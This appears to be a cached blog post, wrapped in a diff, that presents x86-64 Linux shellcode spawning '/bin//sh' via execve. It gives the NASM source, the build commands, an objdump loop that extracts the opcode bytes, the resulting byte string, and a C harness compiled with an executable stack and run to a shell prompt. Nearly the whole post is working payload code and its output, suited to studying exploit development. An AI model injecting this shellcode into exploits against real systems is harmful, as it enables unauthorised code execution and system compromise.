@@ -1,0 +1,36 @@
+I"<hr />
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="o">~</span>  <span class="n">cat</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">asm</span>
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+	<span class="kr">global</span> <span class="n">_start</span>
+<span class="n">_start</span><span class="o">:</span>
+	<span class="k">jmp</span> <span class="n">shell</span>
+<span class="n">here</span><span class="o">:</span>
+	<span class="k">xor</span> <span class="n">rax</span><span class="p">,</span><span class="n">rax</span>
+	<span class="k">pop</span> <span class="n">rdi</span>
+	<span class="k">xor</span> <span class="n">rsi</span><span class="p">,</span><span class="n">rsi</span>
+	<span class="k">xor</span> <span class="n">rdx</span><span class="p">,</span><span class="n">rdx</span>
+	<span class="k">add</span> <span class="n">rax</span><span class="p">,</span><span class="mi">59</span>
+	<span class="k">syscall</span>
+<span class="n">shell</span><span class="o">:</span>
+	<span class="k">call</span> <span class="n">here</span>
+<span class="n">bash</span> <span class="kt">db</span> <span class="s">"/bin//sh"</span>
+</code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~  nasm <span class="nt">-f</span> elf64 shellcode.asm <span class="nt">-o</span> shellcode.o
+➜  ~  ld shellcode.o <span class="nt">-o</span> shellcode
+➜  ~  file shellcode
+shellcode: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, not stripped
+➜  ~  <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>objdump <span class="nt">-d</span> shellcode <span class="nt">-M</span> intel | <span class="nb">grep</span> <span class="s2">"^ "</span> | <span class="nb">cut</span> <span class="nt">-f2</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'\x'</span><span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span><span class="nb">echo</span>
+<span class="se">\x</span>eb<span class="se">\x</span>10<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>5f<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>f6<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>48<span class="se">\x</span>83<span class="se">\x</span>c0<span class="se">\x</span>3b<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>e8<span class="se">\x</span>eb<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68
+</code></pre></div></div>
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x10\x48\x31\xc0\x5f\x48\x31\xf6\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68</span><span class="s">"</span><span class="p">;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode</span><span class="p">;</span> <span class="n">ret</span><span class="p">();}</span>
+</code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~  gcc shellcode.c <span class="nt">-z</span> execstack <span class="nt">-o</span> c_shellcode
+➜  ~  ./shellcode
+<span class="c"># </span>
+</code></pre></div></div>
+<p>–</p>
+<h1 id="author-sectiontext">Author <a href=" https://twitter.com/SectionText">SectionText</a></h1>
+<hr />
+:ET
